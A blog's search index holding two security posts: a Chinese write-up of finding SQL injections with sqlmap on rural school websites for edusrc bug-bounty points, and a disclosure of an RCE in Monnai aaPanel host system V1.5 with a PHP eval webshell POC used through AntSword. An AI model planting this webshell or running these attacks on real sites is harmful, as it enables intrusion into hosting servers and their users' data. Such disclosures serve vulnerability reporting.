<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>一次歪打正着的edusrc挖洞</title>
    <link href="/2024/04/19/%E4%B8%80%E6%AC%A1%E6%AD%AA%E6%89%93%E6%AD%A3%E7%9D%80%E7%9A%84edusrc%E6%8C%96%E6%B4%9E/"/>
    <url>/2024/04/19/%E4%B8%80%E6%AC%A1%E6%AD%AA%E6%89%93%E6%AD%A3%E7%9D%80%E7%9A%84edusrc%E6%8C%96%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>最近在忙着弄Hexo，经常收到edusrc上新礼品的通知，晚上闲的没事看看能不能投机取巧刷几分</p><h1 id="寻找目标"><a href="#寻找目标" class="headerlink" title="寻找目标"></a>寻找目标</h1><p>翻了一下最近几天的漏洞列表，发现大部分都是大佬用0day和通杀刷分</p><p>突然我发现了目标，说不定可以捡个漏<br><img src="/2024/04/19/%E4%B8%80%E6%AC%A1%E6%AD%AA%E6%89%93%E6%AD%A3%E7%9D%80%E7%9A%84edusrc%E6%8C%96%E6%B4%9E/1.png" alt="1"></p><p>这种落单的乡镇中学的官网，一般只要不是使用的建站系统，都有洞可挖</p><p>打开fofa，直接复制学校名搜索<br><img src="/2024/04/19/%E4%B8%80%E6%AC%A1%E6%AD%AA%E6%89%93%E6%AD%A3%E7%9D%80%E7%9A%84edusrc%E6%8C%96%E6%B4%9E/2.png" alt="2"><br>一共四个资产，其中最后学校官网为第三方系统搭建，为了快速刷分直接放弃</p><h1 id="开始挖洞"><a href="#开始挖洞" class="headerlink" title="开始挖洞"></a>开始挖洞</h1><p><img src="/2024/04/19/%E4%B8%80%E6%AC%A1%E6%AD%AA%E6%89%93%E6%AD%A3%E7%9D%80%E7%9A%84edusrc%E6%8C%96%E6%B4%9E/3.png" alt="3"></p><p>首先测试一波最直观的SQL注入漏洞</p><p>打开我们最喜欢的burpsuite，启动xia sql插件</p><p>复制资产URL，填到bp内置浏览器里</p><p>然后无脑瞎点，发现用户注册页面有一个下拉选择学校列表的功能</p><p>直觉告诉我这里有搞头，丢插件测试一波</p><p><img src="/2024/04/19/%E4%B8%80%E6%AC%A1%E6%AD%AA%E6%89%93%E6%AD%A3%E7%9D%80%E7%9A%84edusrc%E6%8C%96%E6%B4%9E/4.png" alt="4"></p><p>继续无脑，sqlmap启动！</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python sqlmap<span class="hljs-selector-class">.py</span> -r <span class="hljs-number">1</span><span class="hljs-selector-class">.txt</span> <span class="hljs-attr">--random-agent</span> <span class="hljs-attr">--threads</span> <span class="hljs-number">10</span> <span class="hljs-attr">--batch</span><br></code></pre></td></tr></table></figure><p>爆金币啦<br><img src="/2024/04/19/%E4%B8%80%E6%AC%A1%E6%AD%AA%E6%89%93%E6%AD%A3%E7%9D%80%E7%9A%84edusrc%E6%8C%96%E6%B4%9E/5.png" alt="5"></p><p>直接拿下，不过可惜不是dba<br><img src="/2024/04/19/%E4%B8%80%E6%AC%A1%E6%AD%AA%E6%89%93%E6%AD%A3%E7%9D%80%E7%9A%84edusrc%E6%8C%96%E6%B4%9E/6.png" alt="6"></p><h1 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h1><p>还剩下2个站，依次点开看了下都是一样的，直接重复又拿到两个sql注入</p><p>edusrc捡漏刷分成功*3<br><img src="/2024/04/19/%E4%B8%80%E6%AC%A1%E6%AD%AA%E6%89%93%E6%AD%A3%E7%9D%80%E7%9A%84edusrc%E6%8C%96%E6%B4%9E/7.png" alt="7"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>edusrc</tag>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>梦奈宝塔主机系统RCE</title>
    <link href="/2022/12/22/%E6%A2%A6%E5%A5%88%E5%AE%9D%E5%A1%94%E4%B8%BB%E6%9C%BA%E7%B3%BB%E7%BB%9FRCE/"/>
    <url>/2022/12/22/%E6%A2%A6%E5%A5%88%E5%AE%9D%E5%A1%94%E4%B8%BB%E6%9C%BA%E7%B3%BB%E7%BB%9FRCE/</url>
    
    <content type="html"><![CDATA[<h1 id="A-vulnerability-about-incorrect-access-control-and-remote-code-execution"><a href="#A-vulnerability-about-incorrect-access-control-and-remote-code-execution" class="headerlink" title="A vulnerability about incorrect access control and remote code execution."></a>A vulnerability about incorrect access control and remote code execution.</h1><p>The V1.5 version of the Monnai aaPanel host system(梦奈宝塔主机系统) has incorrect access control and remote code execution.</p><span id="more"></span><p>This is a system that converts the aaPanel(bt.cn) into some virtual hosts and provides an operation panel. Upload the PHP Trojan to the virtual host directory of the system, and use some tools (such as AntSword) to access the website directory of all users of the system and could acqiure 777 permissions.</p><p>And remote code execution is also possible without disabling certain functions.</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[pass]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;http://&#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_HOST&#x27;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>].<span class="hljs-string">&#x27;?&#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-title function_ invoke__">phpversion</span>();<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>Then use a Webshell management tool to connect shell.(I use AntSword)</p><p><img src="/2022/12/22/%E6%A2%A6%E5%A5%88%E5%AE%9D%E5%A1%94%E4%B8%BB%E6%9C%BA%E7%B3%BB%E7%BB%9FRCE/1.png" alt="1"><br>After that, into FileManage, we can see the website path is &#x2F;www&#x2F;wwwroot&#x2F;mnbt.229741e07&#x2F;</p><p><img src="/2022/12/22/%E6%A2%A6%E5%A5%88%E5%AE%9D%E5%A1%94%E4%B8%BB%E6%9C%BA%E7%B3%BB%E7%BB%9FRCE/2.png" alt="2"></p><p>Return to the parent directory, we can see the list of all websites. All of these have acqiured 755 permissions automatically.  </p><p>Even though these websites has been renamed to other names, we can still use a PHP function to get the URL.</p><p>By the way, we can also execute some code such as phpinfo() or phpversion().</p><p>Via the shell url:<br><img src="/2022/12/22/%E6%A2%A6%E5%A5%88%E5%AE%9D%E5%A1%94%E4%B8%BB%E6%9C%BA%E7%B3%BB%E7%BB%9FRCE/3.png" alt="3"></p><p>We’ve get the page’s url(at the top of this page) and execute the phpinfo() and phpversion() code successfully!</p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RCE</tag>
      
      <tag>POC</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
